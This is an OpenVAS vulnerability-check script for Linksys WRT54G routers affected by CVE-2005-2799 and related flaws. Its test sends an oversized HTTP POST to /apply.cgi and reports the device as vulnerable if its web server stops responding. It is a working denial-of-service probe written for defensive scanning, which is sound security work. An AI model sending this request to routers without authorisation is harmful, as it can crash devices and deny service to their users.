# OpenVAS Vulnerability Test
# $Id: linksys_multiple_vulns.nasl 13685 2019-02-15 10:06:52Z cfischer $
# Description: Linksys multiple remote vulnerabilities
#
# Authors:
# Josh Zlatin-Amishav (josh at ramat dot cc)
#
# Copyright:
# Copyright (C) 2005 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.20096");
  script_version("$Revision: 13685 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-15 11:06:52 +0100 (Fri, 15 Feb 2019) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_bugtraq_id(14822);
  script_cve_id("CVE-2005-2799", "CVE-2005-2914", "CVE-2005-2915", "CVE-2005-2916");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Linksys multiple remote vulnerabilities");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2005 Josh Zlatin-Amishav");
  script_family("Gain a shell remotely");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("WRT54G/banner");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Upgrade to firmware version 4.20.7 or later.");

  script_tag(name:"summary", value:"The remote host appears to be a Linksys WRT54G Wireless Router
  which is affected by multiple flaws.");

  script_tag(name:"insight", value:"The firmware version installed on the remote host is prone to several
  flaws,

  - Execute arbitrary commands on the affected router with root privileges.

  - Download and replace the configuration of affected routers via a special
  POST request to the 'restore.cgi' or 'upgrade.cgi' scripts.

  - Allow remote attackers to obtain encrypted configuration information and,
  if the key is known, modify the configuration.

  - Degrade the performance of affected devices and cause the Web server
  to become unresponsive, potentially denying service to legitimate users.");

  script_xref(name:"URL", value:"http://www.idefense.com/application/poi/display?id=304&type=vulnerabilities");
  script_xref(name:"URL", value:"http://www.idefense.com/application/poi/display?id=305&type=vulnerabilities");
  script_xref(name:"URL", value:"http://www.idefense.com/application/poi/display?id=306&type=vulnerabilities");
  script_xref(name:"URL", value:"http://www.idefense.com/application/poi/display?id=307&type=vulnerabilities");

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);
if ( http_is_dead(port:port) ) exit(0);

banner = get_http_banner(port:port);
if (banner && 'realm="WRT54G"' >< banner) {

  soc = http_open_socket(port);
  if (! soc) exit(0);

  http_set_is_marked_embedded(port:port);

  len = 11000;	# 10058 should be enough
  req = string("POST ", "/apply.cgi", " HTTP/1.0\r\nContent-Length: ", len,
	"\r\n\r\n", crap(len), "\r\n");
  send(socket:soc, data:req);
  http_close_socket(soc);

  sleep(1);

  if(http_is_dead(port: port))
  {
    security_message(port);
    exit(0);
  }
}
